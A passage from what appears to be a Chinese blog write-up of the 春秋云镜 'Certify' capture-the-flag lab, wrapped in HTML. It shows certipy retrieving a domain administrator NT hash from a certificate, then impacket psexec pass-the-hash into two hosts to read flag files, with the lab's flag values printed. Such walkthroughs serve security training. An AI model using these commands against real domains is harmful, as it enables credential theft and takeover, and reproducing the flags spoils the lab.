+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:59:01]  </span>
+</span></span><span class="line"><span class="cl">$ certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7  
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: administrator@xiaorang.lab  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@xiaorang.lab&#39;</span>: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到<code>hash</code>，打横向渗透</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 psexec.py xiaorang.lab/Administrator@172.22.9.7 -hashes :2f1b57eefb2d152196836b0516abea80 -codec gbk  
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag04.txt  
+</span></span><span class="line"><span class="cl">  ______                 _  ___  
+</span></span><span class="line"><span class="cl"> / _____<span class="o">)</span>           _   <span class="o">(</span>_<span class="o">)</span>/ __<span class="o">)</span>  
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /      ____  ____<span class="p">|</span> <span class="p">|</span>_  _<span class="p">|</span> <span class="p">|</span>__ _   _  
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="p">|</span>     / _  <span class="o">)</span>/ ___<span class="o">)</span>  _<span class="o">)</span><span class="p">|</span> <span class="p">|</span>  __<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="se">\_</span>___<span class="o">(</span> <span class="o">(</span>/ /<span class="p">|</span> <span class="p">|</span>   <span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>  
+</span></span><span class="line"><span class="cl"> <span class="se">\_</span>_____<span class="o">)</span>____<span class="o">)</span>_<span class="p">|</span>    <span class="se">\_</span>__<span class="o">)</span>_<span class="p">|</span>_<span class="p">|</span>   <span class="se">\_</span>_  <span class="p">|</span>  
+</span></span><span class="line"><span class="cl">                               <span class="o">(</span>____/  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag04: flag<span class="o">{</span>0afd83d9-90b2-447c-92f0-ce02a95dd97e<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">python3 psexec.py xiaorang.lab/Administrator@172.22.9.26 -hashes :2f1b57eefb2d152196836b0516abea80 -codec gbk  
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag03.txt  
+</span></span><span class="line"><span class="cl">                                ___              .-.  
+</span></span><span class="line"><span class="cl">                               <span class="o">(</span>   <span class="o">)</span>      .-.   /    <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">  .--.      .--.    ___ .-.     <span class="p">|</span> <span class="p">|</span>_     <span class="o">(</span> __<span class="o">)</span>  <span class="p">|</span> .<span class="sb">`</span>. <span class="p">;</span>   ___  ___  
+</span></span><span class="line"><span class="cl"> /    <span class="se">\ </span>   /    <span class="se">\ </span> <span class="o">(</span>   <span class="o">)</span>   <span class="se">\ </span>  <span class="o">(</span>   __<span class="o">)</span>   <span class="o">(</span><span class="s1">&#39;&#39;</span><span class="s2">&#34;)  | |(___) (   )(   )  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  .-. ;  |  .-. ;  | &#39; .-. ;   | |       | |   | |_      | |  | |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  |(___) |  | | |  |  / (___)  | | ___   | |  (   __)    | |  | |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  |      |  |/  |  | |         | |(   )  | |   | |       | &#39;  | |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  | ___  |  &#39; _.&#39;  | |         | | | |   | |   | |       &#39;  `-&#39; |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  &#39;(   ) |  .&#39;.-.  | |         | &#39; | |   | |   | |        `.__. |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#39;  `-&#39; |  &#39;  `-&#39; /  | |         &#39; `-&#39; ;   | |   | |        ___ | |  
+</span></span></span><span class="line"><span class="cl"><span class="s2"> `.__,&#39;    `.__.&#39;  (___)         `.__.   (___) (___)      (   )&#39; |  
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                                           ; `-&#39; &#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s2">                                                            .__.&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">      flag03: flag{fbbb0c3c-dd0f-4fdf-9c7b-a6654cb99900}  </span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-07 19:15:35">Updated on 2025-05-07&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/" data-title="春秋云镜-Certify"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="post-tag" title="Tags - 春秋云镜">春秋云镜</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/" class="post-nav-item" rel="prev" title="春秋云镜-Brute4Road"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>春秋云镜-Brute4Road</a><a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/" class="post-nav-item" rel="next" title="春秋云镜-Time">春秋云镜-Time<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
